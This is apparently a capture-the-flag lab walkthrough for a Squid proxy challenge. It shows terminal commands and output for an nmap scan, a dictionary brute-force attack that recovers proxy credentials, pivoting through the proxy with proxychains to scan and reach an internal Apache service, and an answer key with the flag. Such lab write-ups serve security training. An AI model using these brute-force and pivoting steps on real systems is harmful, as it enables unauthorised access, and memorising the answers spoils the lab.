#### 2. Squid Recon: Dictionary Attack

----

```sh
root@attackdefense:~# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
1701: eth0@if1702: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:0a:01:01:06 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.1.1.6/24 brd 10.1.1.255 scope global eth0
       valid_lft forever preferred_lft forever
1704: eth1@if1705: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:c0:7b:0c:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 192.123.12.2/24 brd 192.123.12.255 scope global eth1
       valid_lft forever preferred_lft forever
root@attackdefense:~#
```

----

```sh
root@attackdefense:~# nmap -sC -sV 192.123.12.3
Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-05 02:05 UTC
Nmap scan report for ffxller1mtp5n2ld8e04bkfvm.temp-network_a-123-12 (192.123.12.3)
Host is up (0.000014s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE    VERSION
3128/tcp open  http-proxy Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
MAC Address: 02:42:C0:7B:0C:03 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.81 seconds
root@attackdefense:~#
```

----

```sh
root@attackdefense:~# nmap --script http-proxy-brute -p3128 192.123.12.3
Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-05 02:06 UTC
Nmap scan report for ffxller1mtp5n2ld8e04bkfvm.temp-network_a-123-12 (192.123.12.3)
Host is up (0.000063s latency).

PORT     STATE SERVICE
3128/tcp open  squid-http
| http-proxy-brute:
|   Accounts:
|     admin:laurie - Valid credentials
|_  Statistics: Performed 49398 guesses in 40 seconds, average tps: 1474.4
MAC Address: 02:42:C0:7B:0C:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 40.53 seconds
root@attackdefense:~#
```

----

```sh
root@attackdefense:~# tail -2 /etc/proxychains.conf
# socks4        127.0.0.1 9050
http 192.123.12.3 3128 admin laurie
root@attackdefense:~#
```

```sh
root@attackdefense:~# proxychains nmap -sV -sT -p- 127.0.0.1
ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-05 02:10 UTC
|S-chain|-<>-192.123.12.3:3128-<><>-127.0.0.1:23-<--denied
|S-chain|-<>-192.123.12.3:3128-<><>-127.0.0.1:8080-<--denied
|S-chain|-<>-192.123.12.3:3128-<><>-127.0.0.1:139-<--denied
|S-chain|-<>-192.123.12.3:3128-<><>-127.0.0.1:993-<--denied
|S-chain|-<>-192.123.12.3:3128-<><>-127.0.0.1:5900-<--denied
|S-chain|-<>-192.123.12.3:3128-<><>-127.0.0.1:8888-<--denied
|S-chain|-<>-192.123.12.3:3128-<><>-127.0.0.1:21-<--denied
|S-chain|-<>-192.123.12.3:3128-<><>-127.0.0.1:135-<--denied
|S-chain|-<>-192.123.12.3:3128-<><>-127.0.0.1:143-<--denied
<----SNIP---->
|S-chain|-<>-192.123.12.3:3128-<><>-127.0.0.1:3128-<><>-OK
|S-chain|-<>-192.123.12.3:3128-<><>-127.0.0.1:3128-<><>-OK
|S-chain|-<>-192.123.12.3:3128-<><>-127.0.0.1:3128-<><>-OK
|S-chain|-<>-192.123.12.3:3128-<><>-127.0.0.1:1996-<><>-OK
|S-chain|-<>-192.123.12.3:3128-<><>-127.0.0.1:1996-<><>-OK
|S-chain|-<>-192.123.12.3:3128-<><>-127.0.0.1:3128-<><>-OK
|S-chain|-<>-192.123.12.3:3128-<><>-127.0.0.1:3128-<><>-OK
|S-chain|-<>-192.123.12.3:3128-<><>-127.0.0.1:1996-<><>-OK
|S-chain|-<>-192.123.12.3:3128-<><>-127.0.0.1:3128-<><>-OK
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00089s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE    VERSION
1996/tcp open  http       Apache httpd 2.4.18 ((Ubuntu))
3128/tcp open  http-proxy Squid http proxy 3.5.12

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 72.52 seconds
root@attackdefense:~#
```

----

```sh
root@attackdefense:~# curl -x admin:laurie@192.123.12.3:3128 127.0.0.1:1996
9fd80e956936a8f0a7c0b756d7aef9b9
root@attackdefense:~#
```

```sh
root@attackdefense:~# proxychains curl 127.0.0.1:1996
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-192.123.12.3:3128-<><>-127.0.0.1:1996-<><>-OK
9fd80e956936a8f0a7c0b756d7aef9b9
root@attackdefense:~#
```

----

###### Questions

- Find the username and password of squid proxy user (use `/usr/share/nmap/nselib/data/usernames.lst` for user wordlist and `/usr/share/nmap/nselib/data/passwords.lst` for password wordlist).

```
# nmap --script http-proxy-brute -p3128 192.123.12.3
admin:laurie
```

- Find the port on which Apache service is listening locally.

```
# tail -2 /etc/proxychains.conf
# proxychains nmap -sV -sT -p- 127.0.0.1
1996
```

- Get the flag from the web server running locally on the proxy server.

```
# curl -x admin:laurie@192.123.12.3:3128 127.0.0.1:1996
# proxychains curl 127.0.0.1:1996
9fd80e956936a8f0a7c0b756d7aef9b9
```

----

EOF